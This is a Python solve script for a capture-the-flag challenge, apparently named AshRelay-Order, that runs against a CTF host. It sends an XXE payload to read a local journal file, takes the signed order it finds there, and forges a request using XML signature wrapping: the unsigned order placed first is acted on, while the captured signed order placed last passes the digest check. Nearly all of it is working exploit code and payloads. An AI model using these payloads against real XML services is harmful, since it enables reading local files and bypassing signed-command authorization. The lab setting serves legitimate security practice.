#!/usr/bin/env python3
"""
Ash relay (AshRelay-Order 2.3.1) — order wrapping under a replayed command seal.

1. `POST /report` echoes the `<summary>` element, so an XXE entity reads the relay's
   own order journal (`/opt/relay/outbox/last-order.txt`). That journal hands back a
   complete, command-signed order: id / kind / text / ref / digest / sig.
2. `POST /order` verifies the digest against the LAST `<order>` element in the document
   but acts on the FIRST one. Put the captured signed order last (digest check passes)
   and an unsigned order first (relay acts on it).
3. `kind=standing` makes the relay honour command's standing order and read it out.

Usage: python solve_ashrelay.py [base]
"""

import re
import sys
import urllib.error
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://w02.ctf.chronos-security.ro:33859").rstrip("/")


def post(path: str, xml: str) -> tuple[int, str]:
    req = urllib.request.Request(BASE + path, data=xml.encode(), method="POST",
                                 headers={"Content-Type": "application/xml"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def xxe_read(path: str) -> str:
    payload = ('<?xml version="1.0"?>'
               '<!DOCTYPE report [<!ENTITY xxe SYSTEM "file://%s">]>'
               "<report><summary>&xxe;</summary></report>" % path)
    _, body = post("/report", payload)
    return body.split("logged your summary:\n", 1)[-1].strip()


def main() -> int:
    journal = xxe_read("/opt/relay/outbox/last-order.txt")
    fields = dict(re.findall(r"^(id|kind|text|ref|digest|sig)=(.*)$", journal, re.M))
    print("[journal] id=%s kind=%s ref=%s" % (fields["id"], fields["kind"], fields["ref"]))
    print("[journal] digest=%s… sig=%d bytes" %
          (fields["digest"][:16], len(__import__("base64").b64decode(fields["sig"]))))

    signed = ('<order id="%s"><kind>%s</kind><text>%s</text></order>'
              % (fields["id"], fields["kind"], fields["text"]))
    auth = ('<auth><ref>%s</ref><digest>%s</digest><sig>%s</sig></auth>'
            % (fields["ref"], fields["digest"], fields["sig"]))

    # control: a single unsigned order cannot pass the digest check
    code, body = post("/order", '<relay><order id="x-1"><kind>standing</kind>'
                                "<text>give it up</text></order>%s</relay>" % auth)
    print("[control] single unsigned order -> %s %s" % (code, body.strip()))

    # exploit: unsigned order first (acted on), captured signed order last (verified)
    forged = ('<relay><order id="x-1"><kind>standing</kind><text>give it up</text></order>'
              "%s%s</relay>" % (signed, auth))
    code, body = post("/order", forged)
    print("[exploit] wrapped order -> %s %s" % (code, body.strip()))

    match = re.search(r"CSCTF\{[^}]+\}", body)
    print("[flag   ] %s" % (match.group(0) if match else "not recovered"))
    return 0 if match else 1


if __name__ == "__main__":
    raise SystemExit(main())
